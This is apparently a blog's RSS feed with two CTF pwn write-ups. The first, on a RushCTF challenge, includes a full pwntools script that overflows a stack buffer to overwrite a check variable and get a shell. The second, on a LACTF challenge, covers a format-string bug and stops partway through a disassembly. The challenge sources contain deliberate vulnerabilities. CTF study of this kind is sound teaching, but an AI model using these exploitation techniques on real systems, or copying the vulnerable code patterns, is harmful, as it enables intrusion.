<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on conflict</title>
        <link>/posts/</link>
        <description>Recent content in Posts on conflict</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sat, 11 Mar 2023 00:00:00 +0000</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>🇬🇧 RushCTF 2023 - pwn/poune</title>
            <link>/posts/2023/03/rushctf-2023-pwn/poune/</link>
            <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/rushctf-2023-pwn/poune/</guid>
            <description>Note Writeup for the first pwn challenge from the RushCTF 2023.
Description Hello kind sir! Can you read flag.txt? poune.zip
File information checksec chall &amp;amp;&amp;amp; file chall [*] &amp;#39;/home/conflict/ctfs/rushctf2023/pwn/poune/chall&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6f24ec1597edb178ec5b862b44e5fbcb92df3137, for GNU/Linux 3.2.0, not stripped So, we&amp;rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with NX enabled.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Writeup for the first <code>pwn</code> challenge from the RushCTF 2023.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Hello kind sir! Can you read flag.txt?
</span></span></code></pre></div><p><a href="https://rush.ctf.cafe/api/assets/poune_29838.zip"><code>poune.zip</code></a></p>
<h2 id="file-information">File information</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">chall</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">chall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/rushctf2023/pwn/poune/chall&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">chall</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">6f24ec1597edb178ec5b862b44e5fbcb92df3137</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>NX</code> enabled.</p>
<p>For the source code, there is no need to decompile the file because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> var;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> check <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04030201</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x30</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Hello kind sir!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;My variable </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">check</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> value is %p.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Could you change it to 0xc0febabe?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, check);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;This is the current buffer: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">0x40</span>, stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x04030201</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Mmmh not quite...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x04030201</span> <span style="color:#f92672">&amp;&amp;</span> check <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xc0febabe</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Mmmh getting closer!...&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;This is the new value of </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">check</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, check);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0febabe</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Thanks man, you&#39;re a life saver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Here is your reward, a shell! &#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Bye bye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>By looking at the code, we see that our goal is to overwrite the value of a variable located on the stack and we&rsquo;re given its current value.</p>
<p>Then, a call to <code>fgets()</code> reads <code>0x40</code> bytes of input and stores it in a <code>0x30</code> bytes buffer, which allows us to overflow it.</p>
<p>Now, we need to know the length of our padding, to do so, we can throw the binary in a decompiler such as <code>Cutter</code>.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/224515003-4d257b58-de17-43ce-91ab-3ea08a2f2651.png" alt="2023-03-11-233206_389x85_scrot"></p>
<p>We see here that our buffer lives at <code>rbp-0x40</code>, which means we would need to send <code>0x40</code> bytes to start overwriting <code>rbp</code>. But that&rsquo;s not our goal, we want to overwrite the <code>var_8h</code> variable, which is the  <code>check</code> variable.</p>
<p><code>0x40</code> - <code>0x8</code> = 56, so we need to send 56 bytes to start overwriting the value of our variable.</p>
<p>Let&rsquo;s craft our payload !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challs.ctf.cafe&#34;</span>, <span style="color:#ae81ff">7777</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Pad 56 bytes to start overwriting </span>
</span></span><span style="display:flex;"><span>    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Pack our value in little-endian (64 bit)</span>
</span></span><span style="display:flex;"><span>    value <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xc0febabe</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/224515008-3a0c5d5e-2944-42c2-beef-09d4e2a6f49a.png" alt="2023-03-11-233825_669x757_scrot"></p>
<p>GG !</p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 LACTF 2023 - pwn/rickroll</title>
            <link>/posts/2023/02/lactf-2023-pwn/rickroll/</link>
            <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/lactf-2023-pwn/rickroll/</guid>
            <description>Note Third pwn challenge from the LACTF 2023. It confirmed that I definitely hate format string vulnerabilities.
Description Make your own custom rickroll with my new rickroll program! Dockerfile, rickroll, rickroll.c
File information checksec rickroll &amp;amp;&amp;amp; file rickroll [*] &amp;#39;/home/conflict/ctfs/lactf2023/rickroll/rickroll&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) rickroll: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a86d346d66fd7261ce17804cc837d0c5f1a2cfa8, for GNU/Linux 3.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Third <code>pwn</code> challenge from the <code>LACTF 2023</code>. It confirmed that I definitely hate format string vulnerabilities.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Make your own custom rickroll with my new rickroll program!
</span></span></code></pre></div><p><a href="https://lactf-challs.storage.googleapis.com/uploads/0e4efb3fd75235a554e2fd64de1cb7d38c4bcec35f80204b78200f5938f68b5b/Dockerfile"><code>Dockerfile</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/dd85b016a5546daee39f65628a67ec14fe38c3bb50198b5df2a3834f195f0b80/rickroll"><code>rickroll</code></a>, <a href="https://lactf-challs.storage.googleapis.com/uploads/6b2eef3271c037a7f568ce89a86463b71ade68d68734eacd75f514baa78176dc/rickroll.c"><code>rickroll.c</code></a></p>
<h2 id="file-information">File information</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">rickroll</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">rickroll</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/lactf2023/rickroll/rickroll&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">rickroll</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">a86d346d66fd7261ce17804cc837d0c5f1a2cfa8</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>So, we&rsquo;re going to work on a 64 bits non-stripped dynamically linked executable, with <code>NX</code> enabled, but it&rsquo;s not a problem for us since we&rsquo;re not going to use a shellcode. Also, it is only <em>Partial RELRO</em> so we will be able to <em>overwrite <code>GOT</code> entries</em></p>
<p>We&rsquo;re given a dockerfile, so we can pull the <code>libc</code> and the <code>dynamic linker</code> from the container to match the remote env</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@023e43a6f3af:/chal# ldd rickroll
</span></span><span style="display:flex;"><span>	linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007fff54d5e000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007f4182295000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	/lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007f418246e000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# ls -la /lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">12</span> Oct <span style="color:#ae81ff">14</span> 19:35 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# cp /lib/x86_64-linux-gnu/libc-2.31.so ./
</span></span><span style="display:flex;"><span>root@023e43a6f3af:/chal# ls
</span></span><span style="display:flex;"><span>Dockerfile  bruteforce.py  flag.txt  libc-2.31.so  rickroll  rickroll.c  solve.py
</span></span></code></pre></div><p>For the source code, there is no need to decompile the file or to struggle with some pseudo-code because we have the <code>.c</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> main_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (main_called) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;nice try&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    main_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Lyrics: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">256</span>, stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Never gonna give you up, never gonna let you down</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Never gonna run around and &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Never gonna make you cry, never gonna say goodbye</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Never gonna tell a lie and hurt you</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>We can see by looking at the code that there is a call to <code>fgets()</code> that reads <code>256 bytes</code> and stores them in the <code>buf</code> variable that is <code>256 bytes</code> long, so no <em>buffer overflow</em> here&hellip;</p>
<p>But we can see this very dangerous line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(buf);
</span></span></code></pre></div><p>This shows that the program is vulnerable to <em>format string exploit</em>. So we will be able to leak addresses from the <code>stack</code> and eventually modify some <code>entries</code>.</p>
<p>If we start thinking about our exploit here, we quickly see we&rsquo;re going to be stuck&hellip; There is no win function so we have to <em>make</em> our way to a shell, but to do that we would need to have a leak of the <code>libc</code>&hellip; That&rsquo;s not a problem since we know there is a <em>format string vulnerability</em>, but the main function doesn&rsquo;t loop so we only have one input to leak <code>libc</code> and overwrite a <code>libc</code> entry&hellip; this is impossible</p>
<blockquote>
<p>I struggled <strong>a lot</strong> on this step, I couldn&rsquo;t figure out how to loop main somehow&hellip; And I ended up seeing something interesting</p>
</blockquote>
<p>By taking a look at the <code>main</code> function in the <em>executable</em> (and not the <code>.c</code> file) by disassembling it, we see that the last <code>printf</code> was replaced by a <code>puts</code> (probably by the compiler)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main 
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401152</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401153</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401156</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040115d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    eax,DWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2f09</span>]        <span style="color:#75715e"># 0x40406c &lt;main_called&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401163</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401165</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x40117d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401167</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe9a</span>]        <span style="color:#75715e"># 0x402008</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040116e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401173</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401178</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x4011fd</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">171</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040117d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ee5</span>],<span style="color:#ae81ff">0x1</span>        <span style="color:#75715e"># 0x40406c &lt;main_called&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401187</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ec2</span>]        <span style="color:#75715e"># 0x404050 &lt;stdout@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040118e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401193</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000401196</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401040</span> <span style="color:#f92672">&lt;</span>setbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040119b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe6f</span>]        <span style="color:#75715e"># 0x402011</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
